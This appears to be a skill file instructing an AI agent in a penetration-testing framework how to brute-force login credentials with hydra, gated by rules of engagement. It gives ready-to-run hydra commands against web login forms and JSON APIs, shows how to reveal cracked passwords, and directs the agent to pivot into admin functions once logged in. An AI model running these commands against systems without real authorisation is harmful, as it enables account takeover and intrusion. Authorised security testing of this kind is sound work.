---
model: haiku
---

# hydra — online credential brute-force (T1110, CWE-307)

Guess valid login/password pairs against a live authentication endpoint — a web form, HTTP basic auth,
or a network service. Exploitation tier — the ROE must allow-list T1110 and name an authoriser.

Run — the target is the **host**; the service, form spec and login/password lists are hydra's own flags
after `--`:

    searu run hydra --technique T1110 --target host -- -s 443 -l admin -P seclists:Passwords/darkweb2017-top100.txt \
      http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid credentials'

For a JSON API, put the body as JSON and add the content-type header, e.g.
`http-post-form '/rest/user/login:{"email"\:"^USER^","password"\:"^PASS^"}:H=Content-Type\: application/json:Invalid email or password'`
(escape colons inside the body/header with `\:`; the fail-string condition goes last). Read results:

    searu findings --tool hydra     # a weak-credentials finding per cracked account
    searu loot --reveal             # the cracked passwords (stored as loot, never in the finding)

Log in with the cracked credential and pivot to the authenticated attack surface (IDOR, admin functions)
within the ROE. Do not paste raw hydra output. See `searu tool advice hydra` for detail.
